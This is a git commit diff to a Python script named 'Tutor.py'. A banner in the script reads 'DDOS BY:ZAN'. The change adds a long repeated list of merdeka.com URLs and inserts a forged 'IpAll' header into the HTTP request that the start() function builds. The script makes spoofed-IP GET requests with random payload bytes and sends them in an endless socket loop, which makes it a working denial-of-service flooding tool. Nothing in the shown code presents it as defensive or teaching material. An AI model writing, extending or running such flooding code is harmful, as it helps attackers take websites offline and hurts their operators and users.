85a73b36cd9307365b040c2a3db4204def65a43e
ZanStore17 <102655575+ZanStore17@users.noreply.github.com>
2023-07-12 19:23:59 +0700

    Update Tutor.py

--- Tutor.py
+++ Tutor.py
@@ -171,6 +171,66 @@ https://Yandex.com
 https://Yandex.com
 https://Yandex.com
 https://Yandex.com """]
+all = [""" https://merdeka.com/
+https://merdeka.com/
+https://merdeka.com/
+https://merdeka.com/
+https://merdeka.com/
+https://merdeka.com/
+https://merdeka.com/
+https://merdeka.com/
+https://merdeka.com/
+https://merdeka.com/
+https://merdeka.com/
+https://merdeka.com/
+https://merdeka.com/
+https://merdeka.com/
+https://merdeka.com/
+https://merdeka.com/
+https://merdeka.com/
+https://merdeka.com/
+https://merdeka.com/
+https://merdeka.com/
+https://merdeka.com/
+https://merdeka.com/
+https://merdeka.com/
+https://merdeka.com/
+https://merdeka.com/
+https://merdeka.com/
+https://merdeka.com/
+https://merdeka.com/
+https://merdeka.com/
+https://merdeka.com/
+https://merdeka.com/
+https://merdeka.com/
+https://merdeka.com/
+https://merdeka.com/
+https://merdeka.com/
+https://merdeka.com/
+https://merdeka.com/
+https://merdeka.com/
+https://merdeka.com/
+https://merdeka.com/
+https://merdeka.com/
+https://merdeka.com/
+https://merdeka.com/
+https://merdeka.com/
+https://merdeka.com/
+https://merdeka.com/
+https://merdeka.com/
+https://merdeka.com/
+https://merdeka.com/
+https://merdeka.com/
+https://merdeka.com/
+https://merdeka.com/
+https://merdeka.com/
+https://merdeka.com/
+https://merdeka.com/
+https://merdeka.com/
+https://merdeka.com/
+https://merdeka.com/
+https://merdeka.com/
+https://merdeka.com/ """]
 print(""" | DDOS |  METHOD  | | DDOS BY:ZAN |
               |  LAYER4  |  TIME:LIFETIME |
               |  LAYER7  |   TCP:443/80   |
@@ -200,15 +260,16 @@ def randomip():
   return(randip)
 
 def start():
-  global userip, acceptall
+  global userip, acceptall, all
   hh = random._urandom(999999)
   xx = int(0)
+  nolakall = "IpAll: "+random.choice(all)+random.choice(userip)+"\r\n"
   ipser = "IP: "+random.choice(userip)+"\r\n"
   accept = random.choice(acceptall)+"\r\n"
   content    = "Content-Type: application/x-www-form-urlencoded\r\n"
   length     = "Content-Length: 0 \r\nConnection: Keep-Alive\r\n"
   target_host = "GET / HTTP/1.1\r\nHost: {0}:{1}\r\n".format(str(ip), int(port))
-  main_req = ipser + content + length + accept + target_host + "\r\n"
+  main_req = ipser + nolakall + content + length + accept + target_host + "\r\n"
   while True:
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
